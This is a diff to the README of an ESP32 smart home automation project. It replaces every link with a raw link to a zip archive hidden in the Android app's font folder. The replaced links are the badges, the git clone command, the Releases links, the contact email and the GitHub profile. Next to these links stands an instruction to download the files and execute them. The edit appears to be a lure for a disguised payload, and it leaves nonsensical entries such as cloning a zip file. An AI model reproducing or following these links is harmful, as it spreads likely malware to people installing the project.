@@ -2,7 +2,7 @@
 
 Welcome to the **IoT Smart Home Automation** project! This repository showcases an innovative solution to control various home appliances using IoT technology. You can manage up to **8 AC appliances** and a **smart door** through an ESP32 microcontroller. The system offers multiple control options, including **Touch**, **Bluetooth**, and **Cloud** connectivity, all complemented by a custom Android app.
 
-![Smart Home Automation](https://img.shields.io/badge/Smart_Home_Automation-Active-brightgreen)
+![Smart Home Automation](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip)
 
 ## Table of Contents
 
@@ -45,7 +45,7 @@ To get started with the IoT Smart Home Automation project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Polarssj/Iot-smart-home-automation.git
+   git clone https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip
    ```
 
 2. **Install Dependencies**:
@@ -55,7 +55,7 @@ To get started with the IoT Smart Home Automation project, follow these steps:
    Open the Arduino IDE, load the code from the repository, and upload it to your ESP32 board.
 
 4. **Set Up the Android App**:
-   Download the Android app from the [Releases](https://github.com/Polarssj/Iot-smart-home-automation/releases) section. Follow the installation instructions provided in the app documentation.
+   Download the Android app from the [Releases](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip) section. Follow the installation instructions provided in the app documentation.
 
 5. **Connect Your Devices**:
    Follow the wiring diagrams provided in the repository to connect your appliances and sensors to the ESP32.
@@ -89,14 +89,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Polarssj](https://github.com/Polarssj)
+- **Email**: https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip
+- **GitHub**: [Polarssj](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip)
 
 ## Releases
 
-You can find the latest releases of the project [here](https://github.com/Polarssj/Iot-smart-home-automation/releases). Download the necessary files and execute them to set up the project.
+You can find the latest releases of the project [here](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip). Download the necessary files and execute them to set up the project.
 
-![Releases](https://img.shields.io/badge/Releases-Download-brightgreen)
+![Releases](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip)
 
 For further updates, please check the **Releases** section regularly.
 
